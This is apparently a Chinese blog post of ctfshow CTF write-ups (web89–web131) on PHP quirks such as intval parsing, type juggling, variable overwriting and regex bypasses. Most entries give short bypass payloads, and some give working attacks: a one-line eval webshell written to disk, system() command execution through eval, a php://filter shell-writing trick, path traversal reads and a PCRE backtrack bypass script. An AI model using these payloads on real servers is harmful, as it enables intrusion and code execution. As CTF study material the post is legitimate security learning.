---
title: PHP特性
date: 2022-03-21 21:23:21
excerpt: PHP特性
categories: 学习
---

# PHP特性

php特性这个东西很杂，覆盖的内容也很多，都是一些零碎的知识点，这次正好借这个刷题的机会，做一个小复习



### web89

```
include("flag.php");
highlight_file(__FILE__);

if(isset($_GET['num'])){
    $num = $_GET['num'];
    if(preg_match("/[0-9]/", $num)){
        die("no no no!");
    }
    if(intval($num)){
        echo $flag;
    }
}
```

这里`preg_match("/[0-9]/", $num`过滤了数字，但是

我们要让`intval($num)`为真，这题考的就是`intval`的特性



**intval()的测试**

> 返回值 
> 成功时返回 var 的 integer 值，失败时返回 0。空的 array 返回 0，非空的 array 
> 返回 1。 

测试了一下

```
<?php

echo intval(1234);  //1234
echo "\n";
echo intval(042);  //34  0开头的，当成了8进制
echo "\n";
echo intval(0x1a);  //26 0x开头，当成16进制
echo "\n";
echo intval(3e3);  //3000 科学计数法 3 X 10的三次方
echo "\n";
echo intval('3e3');  //3000
echo "\n";
echo intval("1234a");  //1234
echo "\n";
echo intval(4.2); //转化为整数
```

回到题目

可以用数组绕过

```
?num[]=a
```



### web90

```
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
} 
```

与上题类似，但这次没过滤数字

这里又要说一下`intval`的相关特性

```
intval ( mixed $var [, int $base = 10 ] )
```

> 如果 `base` 是 0，通过检测 `var` 的格式来决定使用的进制：
>
> - 如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，
> - 如果字符串以 "0" 开始，使用 8 进制(octal)；否则，
> - 将使用 10 进制 (decimal)。

```
intval('4476a',0)=4476
intval('010574',0)=4476
intval('0x117c',0)=4476
```

上述三中均能绕过



### web91

```
show_source(__FILE__);
include('flag.php');
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
} 
```

我们先来看看 `正则匹配修饰符`

```
i 不区分(ignore)大小写；
g 全局(global)匹配
m 多(more)行匹配
s 特殊字符圆点 . 中包含换行符
U 只匹配最近的一个字符串;不重复匹配; 
//修正符:x 将模式中的空白忽略; 
//修正符:A 强制从目标字符串开头匹配;
//修正符:D 如果使用$限制结尾字符,则不允许结尾有换行; 
//修正符:e 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行;  
```

`(preg_match('/^php$/im', $a))`这个匹配以php开头的字符串并且多行匹配

`(preg_match('/^php$/i', $a))`这个也是匹配以php开头的字符串，但不支持多行匹配，只能匹配一行



> preg_match() 在第一次匹配后 将会停止搜索。preg_match_all() 不同于此，它会一直搜索subject 直到到达结尾



`%0a`换行，相当于enter

**payload**

```
?cmd=%0aphp
或?cmd=php%0a1   (但php%0a不行)
```

这里我有个小小的疑惑点，针对第一个 `%0aphp`显然这里是匹配的第一行，第二个payload `php%0a1`，显然这里匹配的是第二行，所以具体的匹配机制有点没懂

请假了一下群里的师傅这里主要跟`^php$`这个有关，`(preg_match('/^php$/i', $a))`这个以一整行为一个整体进行判断，经过测试这个只匹配第一行



### web92

```
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```



> intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法

所以我们可以用e绕过也可以用二进制（0b），十六进制（0x）绕过

**payload**

```
?num=0b1000101111100
?num=0x117c
?num=4476e123
```



### web93

```
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    } 
```

比上一题多过滤了一个字母，这样我们e和二进制，十六进制都用不了，

八进制是以数字0开头的，刚好可以绕过

```
?num=010574
```



### web94

```
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(!strpos($num, "0")){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```

这一题相对于上一题，不让数字0出现在第一位,而且第一个if是`===`强比较

我们可以用小数 `4476.0`绕过 或者

```
?num=4476.0
```

可以在前面加上一个加号，当空格

```
?num=+010574
?num= 010574//空格也可以
```



### web95

```
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("no no no!!");
    }
    if(!strpos($num, "0")){
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```

这里第一个判断又换成弱比较了，只能用 空格和 `+` 绕过

```
?num= 010574
?num=+010574
```



### web96

```
highlight_file(__FILE__);

if(isset($_GET['u'])){
    if($_GET['u']=='flag.php'){
        die("no no no");
    }else{
        highlight_file($_GET['u']);
    }


} 
```

这题没什么过滤直接读当前目录下的flag.php就好

```
?u=./flag.php
```

或者用伪协议读取也行

```
?u=php://filter/resource=flag.php
```



### web97

```
include("flag.php");
highlight_file(__FILE__);
if (isset($_POST['a']) and isset($_POST['b'])) {
if ($_POST['a'] != $_POST['b'])
if (md5($_POST['a']) === md5($_POST['b']))
echo $flag;
else
print 'Wrong.';
}
?> 
```

题目需要我们用post方式传入a和b，并且a!=b（这里是弱比较）

但这里`md5($_POST['a']) === md5($_POST['b'])`这里我们可以利用一个字符串比较的一个特性

> MD5这个函数呢有个漏洞，传入的参数为数组的时候会发生错误，并返回NULL

```
a[]=1&b[]=2
```



### web98

```
include("flag.php");
$_GET?$_GET=&$_POST:'flag';
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);

?> 
```

```
`$_GET?$_GET=&$_POST:'flag';` 
```

这句话解释一下，这是三目运算符

当存在GET传参时，则把post传参地址给get，如果不存在则传的参数为flag

```
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
```

如果传的flag='flag',则把COOKIE传参地址给get,否则让其等于'flag'

```
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag'; 
```

如果传的flag='flag',则把SERVER传参地址给get,否则让其等于'flag'

```
$_GET['HTTP_FLAG']=='flag'?$flag:__FILE__
```

如果传入的HTTP_FLAG=‘flag'显示$flag，否则显示当前页面



如果我们直接用get方式传入

```
?HTTP_FLAG=flag
```

由于存在GET传参，会把post传参地址给get

所以这里我们随便用get方式传入一个，然后用post覆盖掉

```
?num=1111

post:HTTP_FLAG=flag
```

即可highlight_file($flag)，因为$flag不是php文件，所以会导致报错而回显$flag的值



### web99

```
highlight_file(__FILE__);
$allow = array();
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
}

?> 
```

`array_push`

> array_push — 将一个或多个单元压入数组的末尾（入栈）

`in_array`

> 检查数组中是否存在某个值，如果没有设置第三个参数，则使用宽松的比较，先将字符串转化为i数字，再比较

分析一下题目首先将许多随机数放入数组中，然后当传入的n在数组中，将content写入传入的n中

由于这里循环了很多次，出现1的概率比较大（多试几次总能成功）

然后是 1.php在进行判断时 `1.php == 1`

并将一句话木马写入content

```
?n=1.php

POST:content=<?php @eval($_POST[1]);?>
```

蚁剑连接即可



### web100

```
highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
    
} 
```

`is_numeric`

> — 检测变量是否为数字或数字字符串

这个题第一次做的时候时非常懵逼的

这题的解题点在

```
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
```

这里就要讲一下运算符的优先级问题了

```
&& --> || --> = --> and --> or
```

所以题目这里赋值的优先级大于and，即

```
$v0=is_numeric($v1)
```

所以这里我们只需要让v1为数字，后面两个参数可控，v2,v3过滤了分号，

现在就要解决

```
eval("$v2('ctfshow')$v3");
```

突然发现题目注释里有  `flag in class ctfshow; `

我这里直接用管道符了`||`

```
?v1=1&v2=system("cat ctfshow.php")||&v3=;
```



### web101

```
highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)){
        if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
    
} 
```

这个题相比上个，增加了许多过滤

主要还是构造

```
eval("$v2('ctfshow')$v3"); 
```

这里也是看了很多师傅的wp才理解，需要讲一下

`ReflectionClasss`

> 反射类ReflectionClass执行命令
>
> ReflectionClass反射类在PHP5新加入，继承自Reflector，它可以与已定义的类建立映射关系，通过反射类可以对类操作
> 反射类不仅仅可以建立对类的映射，也可以建立对PHP基本方法的映射，并且返回基本方法执行的情况。因此可以通过建立反射类new ReflectionClass(system('cmd'))来执行命令



**payload**

```
?v1=1&v2=echo new ReflectionClass&v3=;
```

最后将 0x2d改为 -  ，发现只有35位，没想到最后一位要爆破。。。看运气咯



### web102

```
highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str);
}
else{
    die('hacker');
}


?>
```

`substr`

> **substr** ( string `$string` , int `$start` [, int `$length` ] ) : string
>
> 返回字符串 `string` 由 `start` 和 `length` 参数指定的子字符串。

这里 `$s = substr($v2,2);`截取了v2的[2:],从第三个字符到末尾

`call_user_func`

> **call_user_func** ( [callable](php/language.types.callable.html) `$callback` [, [mixed](php/language.pseudo-types.html#language.types.mixed) `$parameter` [, [mixed](php/language.pseudo-types.html#language.types.mixed) `$...` ]] ) : [mixed](php/language.pseudo-types.html#language.types.mixed)
>
> 第一个参数 `callback` 是被调用的回调函数，其余参数是回调函数的参数。

这里v1，v3可控，v2要保证能写shell，又要保证能为数字。

这里百思不得其解，看了师傅的wp后，真的要感叹一下，师傅们的创造力啊！

```
<?=`tac *`;  
```

这是我们要执行的命令，进行hex编码后为：3c3f3d60746163202a603b ，发现其中有字母
于是在此之前进行base64编码一次

```
PD89YHRhYyAqYDs= //在进行hex编码
```

```
5044383959485268597941715944733d
```

这时我们发现 `3d`为等号

即v1=hex2bin  v2=00504438395948526859794171594473  v3=php://1.php

**payload**

```
POST:v1=hex2bin

?v2=00504438395948526859794171594473&v3=php://filter/write=convert.base64-decode/resource=1.php
```

太妙了！！



### web103

```
highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    if(!preg_match("/.*p.*h.*p.*/i",$str)){
        file_put_contents($v3,$str);
    }
    else{
        die('Sorry');
    }
}
else{
    die('hacker');
} 
```

过滤的更加多了，用上一题的思路也能解出来，我换一个吧

```
<?=`cat *`;
```

转化为base64

```
PD89YGNhdCAqYDs
```

再转化为ascii的十六进制

```
5044383959474e6864434171594473
```

我们发现这个很巧妙的里面只有一个字母e，但这里可以将其当成科学计数法，

payload

```
?v2=005044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=1.php
```



### web104

```
highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2)){
        echo $flag;
    }
} 
```

数组绕过，sha(a[])会返回null  而null==null



### web105

```
highlight_file(__FILE__);
include('flag.php');
error_reporting(0);
$error='你还想要flag嘛？';
$suces='既然你想要那给你吧！';
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
}foreach($_POST as $key => $value){
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
if(!($_POST['flag']==$flag)){
    die($error);
}
echo "your are good".$flag."\n";
die($suces); 
```

这题其实第一做的时候挺懵逼的，后来仔细理清了一下思路，其实就是简单的变量覆盖

```
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value; 
```

这里将我们用GET方式传入的参数当成KEY，参数的值作为VALUE

最后这里 `$$key=$$value;` 这里key不能等于error，于是

我们传入 `suces=flag`

这样 `$suces=$flag`这里我们成功将flag的值传给了suces，接下来我们再将seces的值传给error

同理，我们用post方式传入 `error=suces`

```
$errot=$suces=$flag
```

最后由于不成立

```
if(!($_POST['flag']==$flag)){
    die($error); 
```

将error打印出来，此时error的值就是flag

**payload**

```
?suces=flag

POST:error=suces
```



### web106

```
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2) && $v1!=$v2){
        echo $flag;
    }
} 
```

数组绕过，这里不重复讲了。。



### web107

```
include("flag.php");

if(isset($_POST['v1'])){
    $v1 = $_POST['v1'];
    $v3 = $_GET['v3'];
       parse_str($v1,$v2);
       if($v2['flag']==md5($v3)){
           echo $flag;
       }

} 
```

`parse_str`

> **parse_str** ( string `$encoded_string` [, array `&$result` ] ) : void
>
> 如果 `encoded_string` 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 `result` 则会设置到该数组里 ）。

这里我们传入v3=flag

`v1=flag=327a6c4304ad5938eaf0efb6cc3e53dc`（其实就是flag经过md5后的值）

**payload**

```
?v3=flag
POST:v1=flag=327a6c4304ad5938eaf0efb6cc3e53dc
```

另一种思路 md5一个数组的值为null，如果v2这个数组中的flag值也为null，null==null

```
?v3[]=
POST:V1=
```



### web108

```
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
    die('error');

}
//只有36d的人才能看到flag
if(intval(strrev($_GET['c']))==0x36d){
    echo $flag;
}
```

其实这个题就考了一个知识点

ereg函数可以用%00截断

payload

```
?c=a%00778
```



### web109

```
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
            eval("echo new $v1($v2());");
    }

} 
```

正则匹配要求v1和v2要包含字母。题目中eval里的语句，和之前web101有点相似。
初始化$v1，v1是个类，$v2()是参数。

这道题用到了魔术方法__toString()，不少php的内置类里都包含有这个方法，如Reflectionclass、Exception、Error
`__toString()`：当一个对象被当作字符串对待的时候，会触发这个魔术方法，格式化输出这个对象所包含的数据。

> PHP5.2.0之前，__toString() 方法只在使用 echo 或 print 时才生效。PHP5.2.0之后，可以在任何字符串环境生效

所以echo使得`$v1`类触发`__toString()`，传递的参数v2会被输出。

**payload**

```
?v1=CachingIterator&v2=system(ls)
?v1=Exception&v2=system('cat fl36dg.txt') 
```



### web110

```
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){
            die("error v2");
    }

    eval("echo new $v1($v2());");

} 
```

以使用FilesystemIterator文件系统迭代器来进行利用，通过新建FilesystemIterator，使用getcwd()来显示当前目录下的文件结构

**payload**

```
?v1=FilesystemIterator&v2=getcwd
```

回显fl36dga.txt

访问url/fl36dga.txt得到flag

其实这里的`FilesystemIterator`没咋弄懂，还需要找师傅请教一下

后续

稍微懂了一点

> 通过新建FilesystemIterator，可以显示当前目录下的文件结构。由于参数内部有个括号，所以不能使用字符串来索引路径，而是要通过拼接方法getcwd()来获取当前的路径

```
<?php
	error_reporting(0);
	echo getcwd().PHP_EOL;
	echo new FilesystemIterator('./').PHP_EOL;
	echo new FilesystemIterator(getcwd());
?>
输出为
D:\PHP
  index.php
  index.php
```



### web111

```
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

function getFlag(&$v1,&$v2){
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
}


if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v2)){
            die("error v2");
    }
    
    if(preg_match('/ctfshow/', $v1)){
            getFlag($v1,$v2);
    }
     
```

当v1传入ctfshow，执行getFlag函数

```
eval("$$v1 = &$$v2;");
    var_dump($$v1);
```

也就是$ctfshow=$$v2,然后将$$v1打印出来

我们另`v2=GLOBALS`

```
var_dump($GLOBALS);
```

payload

```
?v1=ctfshow&v2=GLOBALS
```



### web112

```
highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/\.\.\/|http|https|data|input|rot13|base64|string/i',$file)){
        die("hacker!");
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```

`is_file`

> 判断给定文件名是否为一个正常的文件。

is_file用php伪协议即可绕过

payload

```
?file=php://filter/resource=flag.php
```



### web113

```
highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/filter|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";

```

这题过滤掉了filter，这个协议就用不了，这里增加一点知识点

**linux里`/proc/self/root`是指向根目录的**

也就是如果在命令行中输入`ls /proc/self/root`，其实显示的内容是根目录下的内容

这里我们多次重复即可绕过`is_file`

payload

```
?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```

另一种解法

```
compress.zlib://flag.php
```

应该是把flag.php当成压缩文件来读取，具体的不知道。



### web114

```
error_reporting(0);
highlight_file(__FILE__);
function filter($file){
    if(preg_match('/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
echo "师傅们居然tql都是非预期 哼！";
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```

`compress`和`root`被ban掉了，

山重水复疑无路，柳暗花明又一村

`filter`没有ban

payload

```
?file=php://filter/resource=flag.php
```



### web115

```
include('flag.php');
highlight_file(__FILE__);
error_reporting(0);
function filter($num){
    $num=str_replace("0x","1",$num);
    $num=str_replace("0","1",$num);
    $num=str_replace(".","1",$num);
    $num=str_replace("e","1",$num);
    $num=str_replace("+","1",$num);
    return $num;
}
$num=$_GET['num'];
if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){
    if($num=='36'){
        echo $flag;
    }else{
        echo "hacker!!";
    }
}else{
    echo "hacker!!!"; 
```

`trim`

>  去除字符串首尾处的空白字符（或者其他字符）
>
>  果不指定第二个参数，**trim()** 将去除这些字符
>
>  - " " (ASCII *32* (*0x20*))，普通空格符。
>  - "\t" (ASCII *9* (*0x09*))，制表符。
>  - "\n" (ASCII *10* (*0x0A*))，换行符。
>  - "\r" (ASCII *13* (*0x0D*))，回车符。
>  - "\0" (ASCII *0* (*0x00*))，空字节符。
>  - "\x0B" (ASCII *11* (*0x0B*))，垂直制表符。

这里我们写了个脚本

```
 <?php
for($i=1;$i<=128;$i++){
    $a=chr($i).'1';
    if(trim($a)!=='1'&&is_numeric($a)){
        echo urlencode(chr($i));
        echo "\n";
    }
    
}
```

最后跑出来的结果是 %0c(换页符)

payload

```
?num=%0c36
```



### web123

```
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?/", $c)&&$c<=18){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
```

这里有个很坑的点

> 在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了，such as：`CTF[SHOW.COM`=>`CTF_SHOW.COM`

也就是说当我面`POST`  `CTF_SHOW.COM`时，会自动解析成`CTF_SHOW_COM`

payload

```
POST: CTF_SHOW=1&CTF[SHOW.COM=2&fun=echo $flag
```



### web125

```
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i", $c)&&$c<=16){
         eval("$c".";");
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
} 
```

相比于上一题，题目过路的更多了，echo这些打印函数被过滤

这里我们详细看

```
$a=$_SERVER['argv'];
```

> $_SERVER['argv']：
>
> 1、cli模式（命令行）下
>
> 	第一个参数$_SERVER['argv'][0]是脚本名，其余的是传递给脚本的参数
>
> 2、web网页模式下
>
> 	在web页模式下必须在php.ini开启register_argc_argv配置项
> 		
> 	设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果
> 		
> 	这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]
> 		
> 	$argv,$argc在web模式下不适用

```
我们是在网页模式下的，注意重点：
$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]
而 $_SERVER[‘QUERY_STRING’] 是获取查询语句，也就是?后面的语句
```

payload

```
?$fl0g=flag_give_me;

POST:CTF_SHOW=1&CTF[SHOW.COM=2&fun=eval($a[0])
```

另一种思路

这里没有过滤`highlight_file()`于是我们可以构造

```
fun=highlight_file($_GET[1])
```

payload

```
?1=flag.php
POST:CTF_SHOW=1&CTF[SHOW.COM=2&fun=highlight_file($_GET[1])
```



### web126

```
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i", $c) && strlen($c)<=16){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
} 
```

与上题一样，这回多给几个payload

```
get: a=1+fl0g=flag_give_me
post: CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])
```

数组中用加号(加号在url中起到空格的作用)分隔`$a[1]`对应的就是`fl0g=flag_give_me`，所以下面这种也是可以的

```
get: a=1+2+fl0g=flag_give_me//加号在url中起到空格的作用
post: CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[2])
```

```
<?php
$a=$_SERVER['argv'];
var_dump($a);

传入 a=1+fl0g=flag_give_me
结果如下
array(2) { [0]=> string(3) "a=1" [1]=> string(17) "fl0g=flag_give_me" }

```



### web127

```
error_reporting(0);
include("flag.php");
highlight_file(__FILE__);
$ctf_show = md5($flag);
$url = $_SERVER['QUERY_STRING'];


//特殊字符检测
function waf($url){
    if(preg_match('/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\'|\"|\<|\,|\>|\.|\\\|\//', $url)){
        return true;
    }else{
        return false;
    }
}

if(waf($url)){
    die("嗯哼？");
}else{
    extract($_GET);
}


if($ctf_show==='ilove36d'){
    echo $flag;
}
```

> `$_SERVER['QUERY_STRING'];`获取的查询语句是服务端还没url解码的，所以url编码绕过即可：

写个脚本跑一下

```
<?php
function waf($num){
    if(preg_match('/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\'|\"|\<|\,|\>|\.|\\\|\//', $num)){
        return false;
    }else{
        return true;
    }
}
for($i = 0; $i<129; $i++){
	$num=chr($i);
	if(waf($num)){
		echo "未编码：".$num."   经过编码：".urlencode(chr($i))."\n";
	}
}
?>
```

空格可以绕过，%20

**payload**

```
?ctf show=ilove36d
```



### web128

```
error_reporting(0);
include("flag.php");
highlight_file(__FILE__);

$f1 = $_GET['f1'];
$f2 = $_GET['f2'];

if(check($f1)){
    var_dump(call_user_func(call_user_func($f1,$f2)));
}else{
    echo "嗯哼？";
}



function check($str){
    return !preg_match('/[0-9]|[a-z]/i', $str);
}
```

这题我傻了。。，还是看大师傅的wp吧

考察点是gettext拓展使用

在开启该拓展后 _() 等效于 gettext()

```
<?php
echo gettext("phpinfo");
结果  phpinfo

echo _("phpinfo");
结果 phpinfo
```

所以 `call_user_func('_','phpinfo')` 返回的就是phpinfo

因为我们要得到的flag就在flag.php中，所以可以直接用get_defined_vars

```
get_defined_vars ( void ) : array
此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。
```

**payload**

```
?f1=_&f2=get_defined_vars
```



### web129

```
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['f'])){
    $f = $_GET['f'];
    if(stripos($f, 'ctfshow')>0){
        echo readfile($f);
    }
}
```

路径穿越很简单

`../`   回到上一级目录

`./`    表示当前目录

**payload**

```
?f=../../ctfshow../../../var/www/html/flag.php
```



### web130

```
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
    $f = $_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f, 'ctfshow') === FALSE){
        die('bye!!');
    }

    echo $flag;

} 
```

> preg_match不识别数组，否则返回false，匹配一次返回1，没有返回0
>
> if(0 === flase)返回值为false0不是强等于false的
>
> stripos()函数对数组不识别，遇到数组会返回null，null!==flase

在/s模式下，.匹配任意字符，+表示重复一次或更多次，没错是至少一次！而后面加个?表示懒惰模式，+?表示重复1次或更多次，但尽可能少重复。当然懒惰模式并不影响解题思路，总之就是ctfshow前面必须得有字符才能匹配到，所以直接f=ctfshow就可以了

**payload**

```
?f=ctfshow[]
?f[]=1
?f=ctfshow  (第一个正则匹配时，必须要在ctfshow前面有字符)
```

下面就要介绍p神的PCRE回溯

> https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html



PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限`pcre.backtrack_limit`。我们可以通过`var_dump(ini_get('pcre.backtrack_limit'));`的方式查看当前环境下的上限：

我们通过发送超长字符串的方式，使正则执行失败，最后绕过目标对PHP语言的限制。

脚本

```
import requests
url="http://e07a37a6-9144-4f12-a24c-2fcd2f8cdbd0.challenge.ctf.show/"
data={
    'f':'very'*250000+'ctfshow'
}
r=requests.post(url,data=data)
print(r.text)

```



### web131

```
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
    $f = (String)$_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f,'36Dctfshow') === FALSE){
